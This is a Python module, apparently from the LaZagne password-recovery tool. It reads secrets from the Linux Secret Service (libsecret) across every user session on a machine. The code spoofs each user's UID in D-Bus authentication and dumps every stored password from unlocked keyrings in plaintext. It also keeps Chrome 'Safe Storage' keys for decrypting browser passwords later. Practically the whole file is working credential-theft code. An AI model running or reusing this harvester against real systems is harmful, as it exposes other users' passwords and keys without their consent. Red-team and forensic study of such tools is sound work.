#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lazagne.config.constant import constant
from lazagne.config.module_info import ModuleInfo
from lazagne.config import homes
from binascii import hexlify
import pwd
import traceback

try:
    import jeepney.auth
# except ImportError:
except Exception:
    pass
else:
    # Thanks to @mitya57 for its Work around 
    def make_auth_external():
        hex_uid = hexlify(str(make_auth_external.uid).encode('ascii'))
        return b'AUTH EXTERNAL %b\r\n' % hex_uid
    jeepney.auth.make_auth_external = make_auth_external


class Libsecret(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'libsecret', 'wallet')

    def run(self):
        items = []
        visited = set()
        try:
            import dbus
            import secretstorage
            import datetime
        except ImportError as e:
            self.error('libsecret: {0}'.format(e))
            return []

        for uid, session in homes.sessions():
            try:
                # List bus connection names
                bus = dbus.bus.BusConnection(session)
                if 'org.freedesktop.secrets' not in [str(x) for x in bus.list_names()]:
                    continue
            except Exception:
                self.error(traceback.format_exc())
                continue

            collections = None
            try:
                # Python 2.7
                collections = list(secretstorage.collection.get_all_collections(bus))
            except Exception:
                pass

            if not collections:
                try:
                    # Python 3
                    from jeepney.io.blocking import open_dbus_connection
                    make_auth_external.uid = uid
                    bus = open_dbus_connection(session)
                    collections = secretstorage.get_all_collections(bus)
                except Exception:
                    self.error(traceback.format_exc())
                    continue

            for collection in collections:
                if collection.is_locked():
                    continue

                label = collection.get_label()
                if label in visited:
                    continue

                visited.add(label)

                try:
                    storage = collection.get_all_items()
                except Exception:
                    self.error(traceback.format_exc())
                    continue

                for item in storage:
                    values = {
                        'Owner': pwd.getpwuid(uid).pw_name,
                        'Collection': label,
                        'Label': item.get_label(),
                        'Content-Type': item.get_secret_content_type(),
                        'Password': item.get_secret().decode('utf8'),
                        'Created': str(datetime.datetime.fromtimestamp(item.get_created())),
                        'Modified': str(datetime.datetime.fromtimestamp(item.get_modified())),
                    }

                    # for k, v in item.get_attributes().iteritems():
                    #   values[unicode(k)] = unicode(v)
                    items.append(values)
                    if item.get_label().endswith('Safe Storage'):
                        constant.chrome_storage.append(item.get_secret())

            try:
                bus.flush()
                bus.close()
            except Exception:
                pass

        return items
